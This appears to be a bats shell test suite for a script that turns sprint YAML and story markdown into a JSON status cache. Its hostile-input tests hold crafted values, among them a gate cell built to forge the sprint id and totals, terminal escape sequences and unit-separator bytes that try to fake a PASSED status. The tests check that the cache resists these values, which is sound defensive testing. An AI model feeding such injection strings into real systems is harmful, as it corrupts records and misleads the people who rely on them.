  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e '.' "$CACHE"
  [ "$(jq '[.action_needed[] | select(.rule == "c")] | length' "$CACHE")" = "0" ]
}

@test "long title with special chars is length-capped and JSON-escaped" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  # A 500-char title with quotes, backslashes, and unicode
  local long_title
  long_title="Title with \"double quotes\" and 'single quotes' and \\backslash and unicöde $(printf '%0.s-' $(seq 1 450))"
  local slug="e900-s1-long-title"
  local dir="$IMPL/epic-test/E900-S1-${slug}"
  mkdir -p "$dir"
  cat > "$dir/story.md" <<EOF
---
template: 'story'
key: "E900-S1"
title: "${long_title}"
status: in-progress
points: 5
manual_verification: false
depends_on: []
---

# Story: Long title

> **Status:** in-progress

## Tasks / Subtasks

- [ ] Task 1: Something

## Review Gate

| Review | Status | Report |
|--------|--------|--------|
| Code Review | UNVERIFIED | — |
| QA Tests | UNVERIFIED | — |
| Security Review | UNVERIFIED | — |
| Test Automation | UNVERIFIED | — |
| Test Review | UNVERIFIED | — |
| Performance Review | UNVERIFIED | — |

## Definition of Done

- [ ] All done
EOF

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  # Must be valid JSON (escaping worked)
  jq -e '.' "$CACHE"
  # Title must be capped to 200 chars
  local title_len
  title_len="$(jq -r '.stories[0].title | length' "$CACHE")"
  [ "$title_len" -le 200 ]
}

@test "absent sprint-status.yaml yields sprint null" {
  rm -f "$SPRINT_STATUS_YAML"

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.sprint' "$CACHE")" = "null" ]
}

@test "indentation-defective action-items registry tolerated" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5
  # Known pre-existing indentation defect
  write_action_items <<'YAML'
items:
  - id: "AI-907"
    title: "Broken item"
      status: "open"
    assignee: "user"
    created_at: "2026-10-02"
YAML

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e '.' "$CACHE"
  [ "$(jq '[.action_needed[] | select(.rule == "c")] | length' "$CACHE")" = "0" ]
}

@test "resolved action item produces no rule-c entry" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5
  write_action_items <<'YAML'
items:
  - id: "AI-930"
    title: "Already resolved"
    status: "resolved"
    assignee: "user"
    created_at: "2026-10-02"
  - id: "AI-931"
    title: "Already done"
    status: "done"
    assignee: "user"
    created_at: "2026-10-02"
  - id: "AI-932"
    title: "Deferred"
    status: "deferred"
    assignee: "user"
    created_at: "2026-10-02"
  - id: "AI-933"
    title: "Invalid"
    status: "invalid"
    assignee: "user"
    created_at: "2026-10-02"
YAML

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.action_needed[] | select(.rule == "c")] | length' "$CACHE")" = "0" ]
}

@test "closed sprint with all done produces no rule-d" {
  write_sprint_yaml closed "2026-10-01" "2026-10-14" \
    "E900-S1:done:5" "E900-S2:done:8"
  write_story E900-S1 done 5
  write_story E900-S2 done 8

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.action_needed[] | select(.rule == "d")] | length' "$CACHE")" = "0" ]
}

@test "new key in sidecar or moved story re-resolves path" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:done:5"
  local sf
  sf="$(write_story E900-S1 done 5)"

  # Cold run — path cached in sidecar
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ -f "$SIDECAR" ]

  # Move the story directory (simulates rename/migration)
  local old_dir new_dir
  old_dir="$(dirname "$sf")"
  new_dir="$IMPL/epic-test/E900-S1-moved-story"
  mv "$old_dir" "$new_dir"

  # Re-run — should re-resolve the path
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e '.' "$CACHE"
  [ "$(jq -r '.stories[0].key' "$CACHE")" = "E900-S1" ]
}

# ---------------------------------------------------------------------------
# Stale-review drift recomputation on warm runs
# ---------------------------------------------------------------------------

@test "cold run detects stale review story backdated 49 hours" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5"
  local sf
  sf="$(write_story E900-S1 review 5)"
  # Backdate the story file to 49 hours ago
  local now_ep target_ep target_date
  now_ep="$(date +%s)"
  target_ep=$((now_ep - 49 * 3600))
  touch -t "$(_epoch_to_touchdate "$target_ep")" "$sf"

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.drift[] | select(.type == "stale_review")] | length' "$CACHE")" = "1" ]
  [ "$(jq -r '.drift[] | select(.type == "stale_review") | .story_key' "$CACHE")" = "E900-S1" ]
  local detail_len
  detail_len="$(jq -r '.drift[] | select(.type == "stale_review") | .detail | length' "$CACHE")"
  [ "$detail_len" -le 200 ]
}

@test "warm run adds stale review entry as time passes" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5"
  local sf
  sf="$(write_story E900-S1 review 5)"
  backdate_tree
  # Backdate the story file to 47 hours ago (under threshold)
  local now_ep target_ep
  now_ep="$(date +%s)"
  target_ep=$((now_ep - 47 * 3600))
  touch -t "$(_epoch_to_touchdate "$target_ep")" "$sf"

  # Cold run — under threshold, no stale_review entry
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.drift[] | select(.type == "stale_review")] | length' "$CACHE")" = "0" ]

  # Simulate time passing: backdate file to 49h ago and update the sidecar
  target_ep=$((now_ep - 49 * 3600))
  touch -t "$(_epoch_to_touchdate "$target_ep")" "$sf"
  local new_mt
  new_mt="$(_stat_mtime "$sf")"
  # Update the sidecar story entry to record this new mtime
  local rel="${sf#"$(cd "$PROJECT_ROOT" && pwd -P)"/}"
  [ "$rel" != "$sf" ] || rel="${sf#"$PROJECT_ROOT"/}"
  awk -F'\t' -v k="E900-S1" -v mt="$new_mt" -v path="$rel" '
    $1=="story" && $2==k { print "story\t" k "\t" path "\t" mt; next }
    { print }
  ' "$SIDECAR" > "${SIDECAR}.tmp" && mv "${SIDECAR}.tmp" "$SIDECAR"

  # Warm run — files "unchanged" (sidecar matches), but the story-file mtime
  # is now > 48h from current time: stale_review must appear
  jq '.stories[0].title = "WARM-PATH-MARKER"' "$CACHE" > "$CACHE.new" && mv "$CACHE.new" "$CACHE"
  run "$SCRIPT"
  [ "$(jq -r '.stories[0].title' "$CACHE")" = "WARM-PATH-MARKER" ]
  [ "$status" -eq 0 ]
  [ "$(jq '[.drift[] | select(.type == "stale_review")] | length' "$CACHE")" = "1" ]
}

@test "non-review stories never get stale review drift" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S1:done:5" "E900-S2:in-progress:3" "E900-S3:blocked:2"
  write_story E900-S1 done 5
  write_story E900-S2 in-progress 3
  write_story E900-S3 blocked 2

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.drift[] | select(.type == "stale_review")] | length' "$CACHE")" = "0" ]
}

# ---------------------------------------------------------------------------
# Action needed ordering determinism
# ---------------------------------------------------------------------------

@test "rule c items are ordered by item id deterministically" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5
  write_action_items <<'YAML'
items:
  - id: "AI-920"
    title: "Second item"
    status: "open"
    assignee: "user"
    created_at: "2026-10-05"
  - id: "AI-910"
    title: "First item"
    status: "open"
    assignee: "user"
    created_at: "2026-10-04"
YAML

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.action_needed[] | select(.rule == "c")] | length' "$CACHE")" = "2" ]
  [ "$(jq -r '[.action_needed[] | select(.rule == "c")] | .[0].item_id' "$CACHE")" = "AI-910" ]
  [ "$(jq -r '[.action_needed[] | select(.rule == "c")] | .[1].item_id' "$CACHE")" = "AI-920" ]
}

# ---------------------------------------------------------------------------
# Tier-3 legacy flat file resolution
# ---------------------------------------------------------------------------

@test "tier-3 resolves exact KEY.md legacy flat file" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:done:5"
  mkdir -p "$IMPL/legacy-flat"
  cat > "$IMPL/legacy-flat/E900-S1.md" <<'EOF'
---
template: 'story'
key: "E900-S1"
title: "Legacy flat story"
status: done
points: 5
manual_verification: false
depends_on: []
---
# Story
## Tasks / Subtasks
- [x] Task 1: Done
## Review Gate
| Review | Status | Report |
|--------|--------|--------|
| Code Review | PASSED | --- |
| QA Tests | PASSED | --- |
| Security Review | PASSED | --- |
| Test Automation | PASSED | --- |
| Test Review | PASSED | --- |
| Performance Review | PASSED | --- |
EOF

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.stories | length' "$CACHE")" = "1" ]
  [ "$(jq -r '.stories[0].title' "$CACHE")" = "Legacy flat story" ]
}

# ---------------------------------------------------------------------------
# Hostile and malformed input — the cache must always be valid JSON and no
# field value may change the document structure.
# ---------------------------------------------------------------------------

# backdate_tree — move every fixture file and directory mtime well into the
# past, so a snapshot run does not treat it as written in its own second
# (such entries are deliberately re-read by the next run).
backdate_tree() {
  find "$PROJECT_ROOT" \( -type f -o -type d \) -exec touch -t 202610010000 {} + 2>/dev/null || true
}

# expect_warm_next — precondition for a warm-path test: the sidecar holds no
# "racy" entry, and the next run really takes the warm path (it keeps a
# marker title that any cold rebuild would overwrite).
expect_warm_next() {
  if grep -q 'racy' "$SIDECAR"; then echo "sidecar has racy entries" >&2; return 1; fi
  jq '.stories[0].title = "WARM-PATH-MARKER"' "$CACHE" > "$CACHE.new" && mv "$CACHE.new" "$CACHE"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].title' "$CACHE")" = "WARM-PATH-MARKER" ]
}

# write_raw_story KEY DIRNAME — write stdin as the story file under DIRNAME.
write_raw_story() {
  local key="$1" dirname="$2"
  local dir="$IMPL/epic-test/${dirname}"
  mkdir -p "$dir"
  cat > "$dir/story.md"
  printf '%s' "$dir/story.md"
}

# top_keys — the sorted top-level key set of the cache.
top_keys() { jq -c 'keys' "$CACHE"; }
EXPECTED_TOP_KEYS='["action_needed","active_phase","by_status","day","drift","generated_at","phases","readiness","schema_version","sprint","stories","totals","unphased_stories","user_aliases"]'

@test "invalid-input matrix: task text with separators, globs, quotes, CR, tab and control bytes stays valid JSON" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  # Files whose names a word-splitting glob of the task text would expand to.
  mkdir -p "$TEST_TMP/cwd"
  : > "$TEST_TMP/cwd/false:::zz-a"
  : > "$TEST_TMP/cwd/false:::zz-b"
  local esc bel
  esc="$(printf '\033')"; bel="$(printf '\007')"
  printf -- '---\nkey: "E900-S1"\ntitle: "T"\nstatus: in-progress\npoints: 5\nmanual_verification: false\n---\n\n## Tasks / Subtasks\n\n- [ ] parse a; b and c\n- [ ] zz-*\n- [x] what? [maybe] ;;; :::\n- [ ] say "hi" and \\back\\slash\\\n- [ ] tab\there\n- [ ] crlf line\r\n- [ ] esc %s]0;PWN%s %s[31m red\n\n## Review Gate\n\n| Review | Status | Report |\n|--------|--------|--------|\n| Code Review | PASSED | — |\n' \
    "$esc" "$bel" "$esc" > "$TEST_TMP/story.tmp"
  write_raw_story E900-S1 E900-S1-matrix < "$TEST_TMP/story.tmp" >/dev/null

  cd "$TEST_TMP/cwd"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e . "$CACHE" >/dev/null
  [ "$(top_keys)" = "$EXPECTED_TOP_KEYS" ]
  # Exactly the seven task lines, text preserved literally (no splitting, no globbing).
  [ "$(jq '.stories[0].tasks.total' "$CACHE")" = "7" ]
  [ "$(jq '.stories[0].tasks.items | length' "$CACHE")" = "7" ]
  [ "$(jq -r '.stories[0].tasks.items[0].text' "$CACHE")" = "parse a; b and c" ]
  [ "$(jq -r '.stories[0].tasks.items[1].text' "$CACHE")" = "zz-*" ]
  [ "$(jq -r '.stories[0].tasks.items[2].text' "$CACHE")" = "what? [maybe] ;;; :::" ]
  [ "$(jq '.stories[0].tasks.items[2].done' "$CACHE")" = "true" ]
  [ "$(jq -r '.stories[0].tasks.items[3].text' "$CACHE")" = 'say "hi" and \back\slash\' ]
  [ "$(jq -r '.stories[0].tasks.items[4].text' "$CACHE")" = "tab here" ]
  [ "$(jq -r '.stories[0].tasks.items[5].text' "$CACHE")" = "crlf line" ]
  [ "$(jq -r '.stories[0].tasks.items[6].text' "$CACHE")" = "esc ]0;PWN [31m red" ]
  # No raw control byte survives anywhere in the file.
  run grep -c "$esc" "$CACHE"
  [ "$output" = "0" ]
  run grep -c "$(printf '\r')" "$CACHE"
  [ "$output" = "0" ]
}

@test "invalid-input matrix: gate cells, ledger verdict, dir slug, yaml scalars and registry ids stay valid JSON" {
  cat > "$SPRINT_STATUS_YAML" <<'EOF'
sprint_id: sprint-9\
status: active
start_date: "2026-10-01"
end_date: "2026-10-14"
capacity_utilization: 80%" \x
epic_focus: E9\"x
goals:
  - "goal with \ backslash and ; semicolon"
stories:
  - key: "E900-S1"
    status: "in-progress"
    points: 5
    risk_level: "hi\gh"
    blocked_by: E9"x
EOF
  printf -- '---\nkey: "E900-S1"\ntitle: "T"\nstatus: in\\progress"\npoints: 5\nmanual_verification: true\n---\n\n## Tasks / Subtasks\n\n- [ ] one\n\n## Review Gate\n\n| Review | Status | Report |\n|--------|--------|--------|\n| Code "Review" | PASSED | — |\n| Code Review | PA\\SSED\\ | — |\n| QA Tests | PASSED; x | — |\n| Security Review | "q" | — |\n' \
    | write_raw_story E900-S1 'E900-S1-sl"ug\x' >/dev/null
  write_ledger_row E900-S1 manual-test plan-1 'PAS"S\ED'
  write_action_items <<'YAML'
items:
  - id: 'AI-9001"x\y'
    status: open
    assignee: user
    created_at: '2026-10"01'
YAML

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e . "$CACHE" >/dev/null
  [ "$(top_keys)" = "$EXPECTED_TOP_KEYS" ]
  [ "$(jq -r '.sprint.id' "$CACHE")" = 'sprint-9\' ]
  # A row whose name is not one of the six canonical gates is dropped; the
  # status cells of the canonical rows are kept as literal text.
  [ "$(jq -c '[.stories[0].gates.rows[].name]' "$CACHE")" = '["Code Review","QA Tests","Security Review"]' ]
  [ "$(jq -r '.stories[0].gates.rows[0].status' "$CACHE")" = 'PA\SSED\' ]
  [ "$(jq -r '.stories[0].gates.rows[1].status' "$CACHE")" = 'PASSED; x' ]
  [ "$(jq -r '.stories[0].gates.rows[2].status' "$CACHE")" = '"q"' ]
  [ "$(jq '.stories[0].gates.passed' "$CACHE")" = "0" ]
  [ "$(jq '.stories[0].gates.total' "$CACHE")" = "6" ]
  [ "$(jq -r '.stories[0].slug' "$CACHE")" = 'sl"ug\x' ]
  [ "$(jq -r '.stories[0].manual_test.verdict' "$CACHE")" = 'PAS"S\ED' ]
  [ "$(jq -r '.action_needed[] | select(.rule == "c") | .item_id' "$CACHE")" = 'AI-9001"x\y' ]
  # created_at is not a date, so since falls back to the registry mtime.
  local reg_day
  reg_day="$(jq -rn --argjson e "$(_stat_mtime "$PROJECT_ROOT/.gaia/state/action-items.yaml")" '$e | strftime("%Y-%m-%d")')"
  [ "$(jq -r '.action_needed[] | select(.rule == "c") | .since' "$CACHE")" = "$reg_day" ]
}

@test "crafted review gate cell cannot forge sprint id or totals" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  local inj='P"}]}}],"sprint":{"id":"FORGED","goal":"pwned"},"totals":{"done_points":5,"total_points":5,"done_stories":1,"total_stories":1,"progress_pct":100},"zz":[{"gates":{"rows":[{"q":"'
  printf -- '---\nkey: "E900-S1"\ntitle: "T"\nstatus: in-progress\npoints: 5\nmanual_verification: false\n---\n\n## Tasks / Subtasks\n\n- [ ] one\n\n## Review Gate\n\n| Review | Status | Report |\n|--------|--------|--------|\n| Code Review | %s | — |\n' "$inj" \
    | write_raw_story E900-S1 E900-S1-forge >/dev/null

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e . "$CACHE" >/dev/null
  [ "$(jq -r '.sprint.id' "$CACHE")" = "sprint-test" ]
  [ "$(jq '.totals.progress_pct' "$CACHE")" = "0" ]
  [ "$(top_keys)" = "$EXPECTED_TOP_KEYS" ]
  [ "$(jq -r '.stories[0].gates.rows[0].status' "$CACHE" | cut -c1-20)" = "$(printf '%s' "$inj" | cut -c1-20)" ]
}

# write_sep_story TITLE — a story whose fields carry unit-separator bytes:
# the given title, a task, a gate NAME cell followed by PASSED, and a gate
# status cell.  Every other gate reads FAILED.
write_sep_story() {
  local us; us="$(printf '\037')"
  printf -- '---\nkey: "E900-S1"\ntitle: "%s"\nstatus: in-progress\npoints: 5\nmanual_verification: false\n---\n\n## Tasks / Subtasks\n\n- [ ] a%sb\n\n## Review Gate\n\n| Review | Status | Report |\n|--------|--------|--------|\n| Code Review%sPASSED | FAILED | — |\n| QA Tests | FAIL%sPASSED | — |\n| Security Review | FAILED | — |\n| Test Automation | FAILED | — |\n| Test Review | FAILED | — |\n| Performance Review | FAILED | — |\n' \
    "$1" "$us" "$us" "$us" | write_raw_story E900-S1 E900-S1-sep >/dev/null
}

@test "a unit-separator byte in a title cannot forge manual_test.required" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  # If the separator survived, "true" would land in the manual_verification
  # field of the story record.
  write_sep_story "T$(printf '\037')true"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.stories[0].manual_test.required' "$CACHE")" = "false" ]
  [ "$(jq -r '.stories[0].title' "$CACHE")" = "Ttrue" ]
  [ "$(top_keys)" = "$EXPECTED_TOP_KEYS" ]
}

@test "a unit-separator byte in a review gate cell cannot forge a PASSED status" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_sep_story "T"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  # "Code Review<US>PASSED | FAILED" must never become Code Review = PASSED.
  [ "$(jq '.stories[0].gates.passed' "$CACHE")" = "0" ]
  [ "$(jq '[.stories[0].gates.rows[] | select(.status == "PASSED")] | length' "$CACHE")" = "0" ]
  # The stripped name cell is not a canonical gate, so the row is dropped.
  [ "$(jq -c '[.stories[0].gates.rows[].name]' "$CACHE")" = '["QA Tests","Security Review","Test Automation","Test Review","Performance Review"]' ]
  [ "$(jq -r '.stories[0].gates.rows[0].status' "$CACHE")" = "FAILPASSED" ]
}

@test "unit-separator bytes in task text, ledger verdict and yaml scalars are stripped, not split" {
  local us; us="$(printf '\037')"
  cat > "$SPRINT_STATUS_YAML" <<EOF
sprint_id: "sprint-test"
status: active
epic_focus: "E9${us}x"
goals:
  - "goal${us}one"
stories:
  - key: "E900-S1"
    status: "in-progress"
    points: 5
EOF
  write_sep_story "T"
  write_ledger_row E900-S1 manual-test plan-1 "PASS${us}X"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e . "$CACHE" >/dev/null
  [ "$(top_keys)" = "$EXPECTED_TOP_KEYS" ]
  [ "$(jq -c '[.stories[0].tasks.items[].text]' "$CACHE")" = '["ab"]' ]
  [ "$(jq -r '.stories[0].manual_test.verdict' "$CACHE")" = "PASSX" ]
  [ "$(jq -r '.sprint.epic_focus' "$CACHE")" = "E9x" ]
  [ "$(jq -r '.sprint.goal' "$CACHE")" = "goalone" ]
  run grep -c "$us" "$CACHE"
  [ "$output" = "0" ]
}

# ---------------------------------------------------------------------------
# Field formats, caps, and nulls
# ---------------------------------------------------------------------------

ISO_RE='^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}Z$'

@test "generated_at is ISO-8601 UTC on cold, warm and empty-sprint runs" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5 >/dev/null
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e --arg re "$ISO_RE" '.generated_at | test($re)' "$CACHE"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e --arg re "$ISO_RE" '.generated_at | test($re)' "$CACHE"
  rm -f "$SPRINT_STATUS_YAML"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.sprint' "$CACHE")" = "null" ]
  jq -e --arg re "$ISO_RE" '.generated_at | test($re)' "$CACHE"
}

@test "goal and task text are capped at 200 characters" {
  local long; long="$(printf 'g%.0s' $(seq 1 450))"
  cat > "$SPRINT_STATUS_YAML" <<EOF
sprint_id: "sprint-test"
status: active
start_date: "2026-10-01"
end_date: "2026-10-14"
goals:
  - "${long}"
stories:
  - key: "E900-S1"
    status: "in-progress"
    points: 5
EOF
  printf -- '---\nkey: "E900-S1"\ntitle: "T"\nstatus: in-progress\npoints: 5\n---\n\n## Tasks / Subtasks\n\n- [ ] %s\n' "$long" \
    | write_raw_story E900-S1 E900-S1-caps >/dev/null
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.sprint.goal | length' "$CACHE")" = "200" ]
  [ "$(jq '.stories[0].tasks.items[0].text | length' "$CACHE")" = "200" ]
}

@test "caps count characters, not bytes, so multi-byte UTF-8 is never cut" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  # 250 two-byte characters: a byte cap at 200 would split a character.
  local t; t="$(printf 'é%.0s' $(seq 1 250))"
  printf -- '---\nkey: "E900-S1"\ntitle: "x%s"\nstatus: in-progress\npoints: 5\n---\n' "$t" \
    | write_raw_story E900-S1 E900-S1-utf8 >/dev/null
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.stories[0].title | length' "$CACHE")" = "200" ]
  # Re-encoding round-trips: no replacement character was introduced.
  [ "$(jq -r '.stories[0].title' "$CACHE" | grep -c $'\xef\xbf\xbd')" = "0" ]
  [ "$(jq -r '.stories[0].title | .[1:2]' "$CACHE")" = "é" ]
}

@test "missing start_date and status are null, not empty strings" {
  cat > "$SPRINT_STATUS_YAML" <<'EOF'
sprint_id: "sprint-test"
stories:
  - key: "E900-S1"
    status: "in-progress"
    points: 5
EOF
  write_story E900-S1 in-progress 5 >/dev/null
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.sprint.start_date' "$CACHE")" = "null" ]
  [ "$(jq '.sprint.status' "$CACHE")" = "null" ]
  [ "$(jq '.sprint.end_date' "$CACHE")" = "null" ]
  [ "$(jq '.sprint.total_days' "$CACHE")" = "null" ]
}

@test "yaml present without sprint_id yields sprint null" {
  printf 'status: active\nstories:\n  - key: "E900-S1"\n    status: "in-progress"\n' > "$SPRINT_STATUS_YAML"
  write_story E900-S1 in-progress 5 >/dev/null
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.sprint' "$CACHE")" = "null" ]
  [ "$(jq '.stories | length' "$CACHE")" = "0" ]
}

# ---------------------------------------------------------------------------
# Manual-test verdicts from the review-gate ledger
# ---------------------------------------------------------------------------

@test "ledger verdict is read for every story in a multi-story sprint" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S1:review:5" "E900-S2:review:5" "E900-S3:review:5"
  write_story_with_gates E900-S1 review 5 true >/dev/null
  write_story_with_gates E900-S2 review 5 true >/dev/null
  write_story_with_gates E900-S3 review 5 true >/dev/null
  write_ledger_row E900-S1 manual-test plan-1 PASSED
  write_ledger_row E900-S2 manual-test plan-1 FAILED
  write_ledger_row E900-S3 manual-test plan-1 UNVERIFIED

  run --separate-stderr "$SCRIPT"
  [ "$status" -eq 0 ]
  [ -z "$stderr" ] || ! grep -q 'newline in string' <<< "$stderr"
  [ "$(jq -r '.stories[] | select(.key == "E900-S1") | .manual_test.verdict' "$CACHE")" = "PASSED" ]
  [ "$(jq -r '.stories[] | select(.key == "E900-S2") | .manual_test.verdict' "$CACHE")" = "FAILED" ]
  [ "$(jq -r '.stories[] | select(.key == "E900-S3") | .manual_test.verdict' "$CACHE")" = "UNVERIFIED" ]
  # Only the UNVERIFIED story still needs a manual test.
  [ "$(jq -c '[.action_needed[] | select(.rule == "a") | .story_keys[0]]' "$CACHE")" = '["E900-S3"]' ]
}

@test "rule a fires on an UNVERIFIED verdict and is cleared by a FAILED verdict" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5"
  write_story_with_gates E900-S1 review 5 true >/dev/null
  write_ledger_row E900-S1 manual-test plan-1 UNVERIFIED
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.action_needed[] | select(.rule == "a")] | length' "$CACHE")" = "1" ]

  # The latest row wins across plan ids.
  write_ledger_row E900-S1 manual-test plan-2 FAILED
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].manual_test.verdict' "$CACHE")" = "FAILED" ]
  [ "$(jq '[.action_needed[] | select(.rule == "a")] | length' "$CACHE")" = "0" ]
}

# ---------------------------------------------------------------------------
# Incremental refresh
# ---------------------------------------------------------------------------

@test "backward mtime with changed content is re-parsed" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  local sf
  sf="$(write_story E900-S1 in-progress 5)"
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].status' "$CACHE")" = "in-progress" ]
  expect_warm_next

  # Content changes, mtime moves BACKWARD (git checkout of an older commit).
  sed 's/^status: in-progress/status: review/' "$sf" > "$sf.new" && mv "$sf.new" "$sf"
  touch -t 202501010000 "$sf"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].status' "$CACHE")" = "review" ]
}

@test "unchanged story files are not re-parsed when only the sprint yaml changes" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5" "E900-S2:in-progress:3"
  local s1 s2
  s1="$(write_story E900-S1 in-progress 5)"
  s2="$(write_story E900-S2 in-progress 3)"
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]

  # Sentinel: edit S1's body but restore its mtime — an unchanged file by the
  # mtime contract, so its old parse must be reused.
  cp -p "$s1" "$TEST_TMP/s1.ref"
  sed 's/Build the widget/SENTINEL REPARSED/' "$s1" > "$s1.new" && mv "$s1.new" "$s1"
  touch -r "$TEST_TMP/s1.ref" "$s1"
  # S2 really changes (newer mtime) and must be re-parsed.
  sed 's/Build the widget/S2 CHANGED/' "$s2" > "$s2.new" && mv "$s2.new" "$s2"
  touch -t 203001010000 "$s2"
  # The yaml changes too (the post-transition path): forces the cold path.
  sleep 1
  write_sprint_yaml active "2026-10-01" "2026-10-15" "E900-S1:in-progress:5" "E900-S2:in-progress:3"

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.sprint.end_date' "$CACHE")" = "2026-10-15" ]
  [ "$(jq -r '.stories[] | select(.key == "E900-S1") | .tasks.items[0].text' "$CACHE")" = "Task 1: Build the widget" ]
  [ "$(jq -r '.stories[] | select(.key == "E900-S2") | .tasks.items[0].text' "$CACHE")" = "Task 1: S2 CHANGED" ]
}

@test "warm run serves unchanged files without re-reading them" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  local s1
  s1="$(write_story E900-S1 in-progress 5)"
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  cp -p "$s1" "$TEST_TMP/s1.ref"
  sed 's/^status: in-progress/status: review/' "$s1" > "$s1.new" && mv "$s1.new" "$s1"
  touch -r "$TEST_TMP/s1.ref" "$s1"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].status' "$CACHE")" = "in-progress" ]
}

@test "ledger created after the cold run is picked up by the next run" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5"
  write_story_with_gates E900-S1 review 5 true >/dev/null
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -c '[.action_needed[].rule]' "$CACHE")" = '["a"]' ]
  [ ! -e "$PROJECT_ROOT/.gaia/state/.review-gate-ledger" ]
  expect_warm_next

  write_ledger_row E900-S1 manual-test plan-1 PASSED
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].manual_test.verdict' "$CACHE")" = "PASSED" ]
  [ "$(jq -c '[.action_needed[].rule]' "$CACHE")" = '[]' ]
}

@test "action-items registry created after the cold run is picked up" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5 >/dev/null
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.action_needed[] | select(.rule == "c")] | length' "$CACHE")" = "0" ]
  expect_warm_next
  write_action_items <<'YAML'
items:
  - id: "AI-950"
    status: "open"
    assignee: "user"
    created_at: "2026-10-03"
YAML
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.action_needed[] | select(.rule == "c") | .item_id' "$CACHE")" = "AI-950" ]
}

@test "project config created after the cold run is picked up" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5 >/dev/null
  rm -f "$PROJECT_ROOT/.gaia/config/project-config.yaml"
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  # Default aliases when no config exists.
  [ "$(jq '.user_aliases | length' "$CACHE")" = "0" ] || [ "$(jq '.user_aliases[0]' "$CACHE")" = '"user"' ]
  expect_warm_next
  printf 'sprint_status_mod:\n  user_aliases:\n    - "custom-alias"\n' > "$PROJECT_ROOT/.gaia/config/project-config.yaml"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.user_aliases[0]' "$CACHE")" = "custom-alias" ]
}

